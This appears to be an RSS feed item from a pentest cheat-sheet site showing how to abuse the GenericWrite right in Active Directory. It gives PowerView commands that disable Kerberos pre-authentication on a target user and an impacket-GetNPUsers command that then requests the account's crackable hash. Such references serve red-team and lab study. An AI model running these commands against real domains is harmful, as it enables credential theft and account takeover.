channel.title: GenericWrite on TLDRBins
channel.description: Recent content in GenericWrite on TLDRBins

item.title: GenericWrite
item.description: Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10
